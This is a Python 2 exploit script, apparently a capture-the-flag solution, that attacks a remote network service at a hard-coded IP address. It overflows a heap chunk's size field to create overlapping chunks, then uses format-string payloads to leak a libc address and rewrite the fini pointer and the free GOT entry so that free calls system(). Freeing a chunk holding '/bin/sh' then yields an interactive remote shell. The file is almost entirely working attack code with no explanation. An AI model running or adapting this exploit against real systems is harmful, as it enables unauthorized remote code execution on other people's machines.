#!/usr/bin/env python
import struct,socket,telnetlib

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data
s = socket.create_connection(("149.13.33.84",1519))
f = s.makefile('rw',bufsize=0)

#1. overflow INTERNAL_SIZE_T size
#2. create overlapping chunks
#3. trigger format string bug
#4. rewrite fini function pointer -> like dtor
raw_input("STAGE1")

f.write("4\n") #delete order 2
f.write("1\n") # edit order 1

payload = "%13$s"
payload += "%" + str(int("0xa1d",16)) + "x"
payload += "%14$hn"
payload = payload.ljust(136,"A")
payload += p(0x151) # overflow size
f.write(payload + "\n") # order 1

# main is at 0x400a39

fini = 0x6011b8
main_got = 0x6013f8
egg = "5" * 8 + p(main_got) + p(0x6011b8)
egg = egg.ljust(130,"A")

f.write(egg + "\n") # submit

print read_until("Order 1:")
print read_until("Order 1:")
print read_until("Order 1:")
leak = read_until("\n")
print leak

leak = leak[1:7] + "\x00" * 2
leak = struct.unpack("<Q",leak)[0]
libc_base = leak - 0x21dd0
libc_system = libc_base + 0x46640
#libc_base = leak - 0x20950
#libc_system = libc_base + 0x443d0
print hex(leak)
print "libc system is at " + hex(libc_system)

# stage 2 -> rewrite free got table

raw_input("STAGE2")

f.write("4\n") #delete order 2
f.write("1\n") # edit order 1

part1 = libc_system & 0xffff # 32-0
part2 = (libc_system >> 16) & 0xff

print "part1 is " + hex(part1)
print "part2 is " + hex(part2)

main = 0xa39
count = (part1-22) + (part2 + 48 + 144)
print "count is " + hex(count)

payload = "%" + str(part1-22) + "x"
payload += "%13$hn"
payload += "%" + str(part2 + 48 + 144) + "x"
payload += "%14$hhn"
payload += "%" + str(0xffff-count - 15 + main - 6) + "x"
payload += "%15$hn"
payload = payload.ljust(136,"A")
payload += p(0x151) # overflow size
f.write(payload + "\n") # order 1

free_got = 0x6013b8
fini2 = 0x6011f0
egg = "5" * 8 + p(0x6013b8) + p(0x6013ba) + p(fini2)
egg = egg.ljust(130,"A")
f.write(egg + "\n") # submit

f.write("1\n") # edit 1
f.write("/bin/sh\x00\n")
f.write("3\n") # free 1

shell()


